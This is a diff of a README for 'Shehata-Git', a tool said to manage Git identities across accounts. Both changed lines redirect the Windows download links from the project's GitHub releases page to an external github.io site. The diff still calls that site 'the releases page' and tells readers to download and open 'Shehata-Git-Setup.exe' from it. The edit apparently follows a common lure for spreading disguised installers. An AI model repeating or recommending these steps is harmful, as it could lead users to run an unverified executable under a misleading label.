@@ -1,6 +1,6 @@
 # 🗂️ Shehata-Git - Manage Your Git Identities Across Accounts
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Elviraorthodox375/Shehata-Git/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://elviraorthodox375.github.io)
 
 ## 🤔 What Does Shehata-Git Do?
 
@@ -31,7 +31,7 @@ It maps each of your repositories to the correct GitHub account. When you make a
 
 ## 📥 How to Download and Install
 
-1. Visit the releases page: [https://github.com/Elviraorthodox375/Shehata-Git/releases](https://github.com/Elviraorthodox375/Shehata-Git/releases)
+1. Visit the releases page: [https://elviraorthodox375.github.io](https://elviraorthodox375.github.io)
 2. Find the latest version (look for the newest release at the top)
 3. Download the file named `Shehata-Git-Setup.exe`
 4. Open the file you downloaded
